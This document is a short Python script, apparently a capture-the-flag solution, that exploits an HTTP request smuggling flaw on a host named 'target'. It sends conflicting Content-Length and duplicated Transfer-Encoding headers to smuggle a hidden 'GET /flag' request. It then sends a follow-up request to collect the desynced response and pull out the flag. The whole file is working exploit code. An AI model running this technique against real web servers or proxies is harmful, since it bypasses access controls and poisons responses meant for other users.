#!/usr/bin/env python3
import re
import socket
import sys

HOST = "target"
PORT = 8301


def exchange(raw: bytes) -> bytes:
    s = socket.create_connection((HOST, PORT))
    s.settimeout(4)
    s.sendall(raw)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            head, sep, body = data.partition(b"\r\n\r\n")
            if sep:
                cl = 0
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        cl = int(line.split(b":", 1)[1].strip())
                if cl and len(body) >= cl:
                    break
    except socket.timeout:
        pass
    finally:
        s.close()
    return data


def main() -> int:
    smuggled = b"0\r\n\r\nGET /flag HTTP/1.1\r\nHost: target:8301\r\n\r\n"
    req1 = (
        b"POST / HTTP/1.1\r\nHost: target:8301\r\n"
        b"Content-Length: " + str(len(smuggled)).encode() + b"\r\n"
        b"Transfer-Encoding: identity\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n" + smuggled
    )
    exchange(req1)

    req2 = b"GET / HTTP/1.1\r\nHost: target:8301\r\n\r\n"
    resp = exchange(req2)
    sys.stdout.write(resp.decode("latin1", "replace"))
    m = re.search(rb"[A-Za-z0-9_]+\{[^}]+\}", resp)
    if not m:
        print("NO FLAG FOUND", file=sys.stderr)
        return 1
    print(m.group(0).decode(), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
